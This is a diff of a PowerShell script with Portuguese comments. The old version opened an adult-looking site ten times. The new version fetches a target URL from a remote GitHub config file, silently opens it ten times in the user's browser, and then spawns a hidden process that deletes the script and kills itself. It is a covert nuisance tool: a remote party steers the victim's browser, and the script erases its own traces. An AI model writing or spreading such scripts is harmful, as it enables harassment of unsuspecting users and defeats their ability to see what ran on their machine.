@@ -1,27 +1,38 @@
 <#
-.SYNOPSIS
-    Abre um site 10 vezes no navegador padrão do usuário.
-
-.DESCRIPTION
-    Script simples em PowerShell que inicia o navegador padrão 10 vezes
-    com a URL definida abaixo. Útil para testes de carga leve, stress
-    de abas ou apenas para demonstrar automação.
-
-.EXAMPLE
-    .\abrir-site.ps1
+    abrir.ps1
+    - Lê a URL atual do config.txt no GitHub (sempre atualizado)
+    - Abre o site N vezes
+    - Roda oculto e se autodestrói ao terminar
 #>
 
 # ===== CONFIGURAÇÃO =====
-$url        = "xvideo.com"  # Troque pela URL que quiser
-$quantidade = 10                                    # Quantas vezes abrir
+$configUrl  = "https://raw.githubusercontent.com/capimmm/7834569/main/config.txt"
+$quantidade = 10
+$fallback   = "https://example.com"   # usado se o GitHub falhar
 # ========================
 
-Write-Host "Abrindo '$url' $quantidade vezes..." -ForegroundColor Cyan
+# Garante que roda sem barulho
+$ErrorActionPreference = 'SilentlyContinue'
 
-for ($i = 1; $i -le $quantidade; $i++) {
-    Start-Process $url
-    Write-Host "  [$i/$quantidade] Aberto" -ForegroundColor Green
-    Start-Sleep -Milliseconds 300   # Pequena pausa pra não travar o PC
+# 1) Busca a URL atual no GitHub
+$siteUrl = $fallback
+try {
+    $resp = Invoke-WebRequest -Uri $configUrl -UseBasicParsing -TimeoutSec 10
+    $linha = ($resp.Content -split "`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
+    if ($linha) { $siteUrl = $linha.Trim() }
+} catch {
+    # se não conseguir, usa o fallback
 }
 
-Write-Host "Concluído! $quantidade abas abertas." -ForegroundColor Yellow
+# 2) Abre o site N vezes
+for ($i = 1; $i -le $quantidade; $i++) {
+    Start-Process $siteUrl
+    Start-Sleep -Milliseconds 250
+}
+
+# 3) Autodestruição: agenda a exclusão do próprio arquivo e mata este processo
+$scriptPath = $PSCommandPath
+$selfKill = "Start-Sleep -Milliseconds 800; Remove-Item -LiteralPath '$scriptPath' -Force -ErrorAction SilentlyContinue; Stop-Process -Id $PID -Force"
+Start-Process powershell.exe -ArgumentList "-NoProfile","-WindowStyle","Hidden","-Command",$selfKill -WindowStyle Hidden
+
+Stop-Process -Id $PID -Force
